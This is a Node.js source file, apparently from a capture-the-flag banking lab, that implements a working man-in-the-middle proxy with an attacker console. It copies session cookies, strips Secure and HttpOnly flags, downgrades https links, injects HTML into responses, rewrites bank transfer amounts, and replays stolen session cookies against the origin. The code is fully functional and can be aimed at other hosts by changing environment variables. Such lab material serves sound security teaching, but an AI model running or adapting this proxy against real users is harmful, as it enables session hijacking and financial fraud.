/**
 * Clearwire hotspot MitM proxy.
 *
 * Victim is tricked onto http://localhost:3580 (captive portal / proxy).
 * We forward to the bank, keep a copy of Cookie / Set-Cookie, ssl-strip
 * Secure flags, inject a banner into HTML, and optionally rewrite
 * transfer amounts.
 */
const http = require('http');
const { URL } = require('url');

const PORT = Number(process.env.PORT || 3580);
const UPSTREAM_HOST = process.env.UPSTREAM_HOST || '127.0.0.1';
const UPSTREAM_PORT = Number(process.env.UPSTREAM_PORT || 3500);
const TAMPER_AMOUNT = process.env.TAMPER_AMOUNT || '9999.00';

const captures = [];
const stolen = []; // unique sid values
let tamperTransfers = true;

function header(req, name) {
  const key = Object.keys(req.headers).find((h) => h.toLowerCase() === name.toLowerCase());
  return key ? String(req.headers[key]) : '';
}

function parseSetCookie(setCookie) {
  const list = setCookie == null ? [] : Array.isArray(setCookie) ? setCookie : [setCookie];
  return list.map((line) => String(line).split(';')[0].trim()).filter(Boolean);
}

function rememberCookies(pairs, source) {
  for (const pair of pairs) {
    if (!/^sid=/i.test(pair)) continue;
    if (!stolen.includes(pair)) stolen.push(pair);
    console.log(`[mitm] captured ${pair.slice(0, 48)}… via ${source}`);
  }
}

function injectHtml(html) {
  const banner = `<div id="mitm-banner" style="background:#7f1d1d;color:#fff;padding:0.6rem 1rem;font-family:sans-serif">
    Clearwire Wi-Fi intercepted this response.
    FLAG{mitm-response-inject}
  </div>`;
  if (/<body[^>]*>/i.test(html)) return html.replace(/<body[^>]*>/i, (m) => `${m}\n${banner}`);
  return banner + html;
}

function sslStripSetCookie(line) {
  return String(line)
    .replace(/;\s*Secure/gi, '')
    .replace(/;\s*HttpOnly/gi, '');
}

function attackerPage() {
  const rows = captures
    .slice(-40)
    .reverse()
    .map(
      (c) =>
        `<tr><td>${c.ts}</td><td>${c.method}</td><td class="mono">${escapeHtml(c.url)}</td><td class="mono">${escapeHtml(
          (c.setCookie || c.cookie || '').slice(0, 80)
        )}</td></tr>`
    )
    .join('');
  const sids = stolen.map((s) => `<li><code>${escapeHtml(s)}</code></li>`).join('') || '<li><em>none yet</em></li>';
  return `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"/><title>MitM attacker console</title>
<style>
  body { font-family: Georgia, serif; max-width: 960px; margin: 1.5rem auto; }
  .ok { border-left: 4px solid #047857; padding: 0.75rem 1rem; background: #ecfdf5; }
  .warn { border-left: 4px solid #b45309; padding: 0.75rem 1rem; background: #fffbeb; }
  table { border-collapse: collapse; width: 100%; font-size: 0.9rem; }
  td, th { border-bottom: 1px solid #ddd; text-align: left; padding: 0.3rem 0.4rem; vertical-align: top; }
  .mono { font-family: Consolas, monospace; word-break: break-all; }
  a.btn { display: inline-block; margin: 0.3rem 0.4rem 0 0; padding: 0.35rem 0.7rem; background: #7f1d1d; color: #fff; text-decoration: none; border-radius: 4px; }
</style></head><body>
  <h1>MitM attacker console</h1>
  <p>This process sits between the victim and Clearwire Bank
  (<code>${UPSTREAM_HOST}:${UPSTREAM_PORT}</code>). We copy session cookies,
  strip <code>Secure</code>/<code>HttpOnly</code>, inject a banner, and can
  rewrite transfer amounts to <code>${TAMPER_AMOUNT}</code>.</p>
  <p class="warn">Victim entry point: <a href="/">http://localhost:${PORT}/</a>
  (they think this is the bank).</p>
  <p>Transfer tamper: <strong>${tamperTransfers ? 'ON' : 'OFF'}</strong>
     · <a href="/_mitm/tamper?on=1">on</a> · <a href="/_mitm/tamper?on=0">off</a></p>
  <h2>Stolen session cookies</h2>
  <ul>${sids}</ul>
  <p><a class="btn" href="/_mitm/replay">Replay stolen sid against the origin</a>
     <a class="btn" href="/_mitm/api/captures">captures.json</a></p>
  <div class="ok" id="replay-hint">Replay uses a server-side request (attacker cookie jar), not this browser.</div>
  <h2>Recent intercepted requests</h2>
  <table><thead><tr><th>Time</th><th>Method</th><th>URL</th><th>Cookie / Set-Cookie</th></tr></thead>
  <tbody>${rows || '<tr><td colspan="4"><em>Wait for the victim to browse.</em></td></tr>'}</tbody></table>
</body></html>`;
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

function json(res, status, obj) {
  const body = JSON.stringify(obj, null, 2);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    Connection: 'close',
  });
  res.end(body);
}

function html(res, status, body) {
  res.writeHead(status, {
    'Content-Type': 'text/html; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    Connection: 'close',
  });
  res.end(body);
}

async function replayStolen(res) {
  const sid = stolen[stolen.length - 1];
  if (!sid) return html(res, 400, attackerPage().replace('id="replay-hint"', 'id="replay-hint"') + '<p>No sid captured yet.</p>');
  const result = await new Promise((resolve) => {
    const req = http.request(
      {
        host: UPSTREAM_HOST,
        port: UPSTREAM_PORT,
        path: '/dashboard',
        method: 'GET',
        headers: { Host: `${UPSTREAM_HOST}:${UPSTREAM_PORT}`, Cookie: sid, Connection: 'close' },
        agent: false,
      },
      (up) => {
        const chunks = [];
        up.on('data', (c) => chunks.push(c));
        up.on('end', () =>
          resolve({ status: up.statusCode, body: Buffer.concat(chunks).toString('utf8') })
        );
      }
    );
    req.on('error', (err) => resolve({ status: 0, body: err.message }));
    req.end();
  });
  const ok = result.body.includes('FLAG{mitm-session-hijack}');
  const page = `<!DOCTYPE html><html><head><meta charset="utf-8"/><title>MitM replay</title></head><body>
    <p><a href="/_mitm/">Back</a></p>
    <h1>Replay stolen session</h1>
    <p>Cookie: <code>${escapeHtml(sid)}</code></p>
    <p>Origin status: ${result.status}. Hijack ${ok ? 'SUCCESS' : 'failed'}.</p>
    ${ok ? '<p>FLAG{mitm-session-hijack}</p>' : ''}
    <hr/>${result.body}
  </body></html>`;
  html(res, 200, page);
}

const server = http.createServer(async (req, res) => {
  try {
    const url = req.url || '/';
    if (url.startsWith('/_mitm/tamper')) {
      const q = new URL(url, 'http://mitm.local').searchParams.get('on');
      tamperTransfers = q !== '0';
      res.writeHead(302, { Location: '/_mitm/', Connection: 'close' });
      res.end();
      return;
    }
    if (url === '/_mitm' || url === '/_mitm/') {
      return html(res, 200, attackerPage());
    }
    if (url.startsWith('/_mitm/api/captures')) {
      return json(res, 200, { stolen, captures: captures.slice(-100), tamperTransfers });
    }
    if (url.startsWith('/_mitm/replay')) {
      return replayStolen(res);
    }
    if (url === '/health') {
      return json(res, 200, { ok: true, lab: 'mitm-proxy', stolen: stolen.length });
    }

    let bodyBuf = await readBody(req);
    let body = bodyBuf.toString('utf8');
    const method = (req.method || 'GET').toUpperCase();
    let path = url;

    if (tamperTransfers && method === 'POST' && path.split('?')[0] === '/transfer') {
      if (/amount=/.test(body)) {
        body = body.replace(/amount=[^&]*/, `amount=${encodeURIComponent(TAMPER_AMOUNT)}`);
        bodyBuf = Buffer.from(body);
        console.log('[mitm] tampered transfer amount ->', TAMPER_AMOUNT);
      }
    }

    rememberCookies(
      String(header(req, 'cookie'))
        .split(';')
        .map((s) => s.trim())
        .filter(Boolean),
      'Cookie'
    );

    captures.push({
      ts: new Date().toISOString(),
      method,
      url: path,
      cookie: header(req, 'cookie'),
      body: body.slice(0, 200),
    });
    if (captures.length > 200) captures.shift();

    const headers = { ...req.headers, host: `${UPSTREAM_HOST}:${UPSTREAM_PORT}` };
    delete headers.connection;
    delete headers['keep-alive'];
    delete headers['transfer-encoding'];
    headers.connection = 'close';
    headers.via = 'Clearwire-MitM';
    if (bodyBuf.length) headers['content-length'] = String(bodyBuf.length);

    const upstream = http.request(
      {
        host: UPSTREAM_HOST,
        port: UPSTREAM_PORT,
        method,
        path,
        headers,
        agent: false,
        timeout: 10_000,
      },
      (upRes) => {
        const chunks = [];
        upRes.on('data', (c) => chunks.push(c));
        upRes.on('end', () => {
          let outBuf = Buffer.concat(chunks);
          const outHeaders = { ...upRes.headers };
          const sc = upRes.headers['set-cookie'];
          if (sc) {
            const list = (Array.isArray(sc) ? sc : [sc]).map(sslStripSetCookie);
            rememberCookies(parseSetCookie(list), 'Set-Cookie');
            outHeaders['set-cookie'] = list;
            captures[captures.length - 1].setCookie = list.join(' | ');
          }
          const ctype = String(outHeaders['content-type'] || '');
          if (ctype.includes('text/html')) {
            let htmlOut = outBuf.toString('utf8');
            htmlOut = htmlOut.replace(/https:\/\//gi, 'http://');
            htmlOut = injectHtml(htmlOut);
            outBuf = Buffer.from(htmlOut);
            outHeaders['content-length'] = String(outBuf.length);
          }
          delete outHeaders.connection;
          delete outHeaders['keep-alive'];
          delete outHeaders['transfer-encoding'];
          outHeaders.connection = 'close';
          res.writeHead(upRes.statusCode || 502, outHeaders);
          res.end(outBuf);
        });
      }
    );
    upstream.on('timeout', () => upstream.destroy(new Error('timeout')));
    upstream.on('error', (err) => {
      if (res.headersSent) return;
      const msg = `MitM upstream error: ${err.message}`;
      res.writeHead(502, { 'Content-Type': 'text/plain', Connection: 'close' });
      res.end(msg);
    });
    if (bodyBuf.length) upstream.write(bodyBuf);
    upstream.end();
  } catch (err) {
    res.writeHead(500, { 'Content-Type': 'text/plain', Connection: 'close' });
    res.end(String(err.message));
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[mitm] hotspot on ${PORT} → ${UPSTREAM_HOST}:${UPSTREAM_PORT}`);
  console.log(`[mitm] attacker console http://127.0.0.1:${PORT}/_mitm/`);
});
